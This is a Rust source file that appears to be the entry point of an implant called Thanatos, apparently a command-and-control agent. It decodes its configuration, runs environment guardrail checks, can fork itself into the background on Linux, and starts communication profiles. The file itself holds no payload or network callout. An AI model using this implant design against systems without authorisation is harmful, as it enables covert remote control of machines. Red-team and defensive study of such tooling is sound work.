#![forbid(unsafe_code)]

use errors::ThanatosError;
use prost::Message;
use thanatos_protos::config::{Config, InitAction};

use crate::profile_mgr::manager::ProfileManager;

mod crypto;
mod errors;
mod guardrails;
mod logging;
mod profile_mgr;
mod system;

pub fn entrypoint(config: &[u8]) {
    let agent_config = match Config::decode(config) {
        Ok(c) => c,
        Err(e) => {
            log!("Failed to decode config: {:?}", e);
            return;
        }
    };

    if !guardrails::run_checks(&agent_config) {
        return;
    }

    match agent_config.initaction() {
        InitAction::None => {
            if let Err(e) = run_agent(agent_config) {
                log!("{:?}", e);
            }
        }
        InitAction::Thread => {
            std::thread::spawn(|| run_agent(agent_config));
        }
        #[cfg(target_os = "linux")]
        InitAction::Fork => {
            use ffiwrappers::linux::fork;
            match fork::fork() {
                Ok(fork::ForkProcess::Child) => {
                    let _ = run_agent(agent_config);
                }
                Err(e) => {
                    log!("Failed to fork process: {:?}", e);
                }
                _ => (),
            }
        }

        #[cfg(target_os = "windows")]
        InitAction::Fork => {
            if let Err(e) = run_agent(agent_config) {
                log!("{:?}", e);
            }
        }
    };
}

fn run_agent(agent_config: Config) -> Result<(), ThanatosError> {
    let manager = ProfileManager::new(&agent_config);
    std::thread::scope(|scope| {
        let profiles = match manager.run(scope) {
            Ok(mgr) => mgr,
            Err(e) => {
                log!("Failed to run profiles: {:?}", e);
                return;
            }
        };

        while profiles.running() {
            log!("Agent thread waiting for message");
            let _msg = match profiles.receiver.recv() {
                Ok(m) => m,
                Err(_) => break,
            };
        }
    });

    Ok(())
}
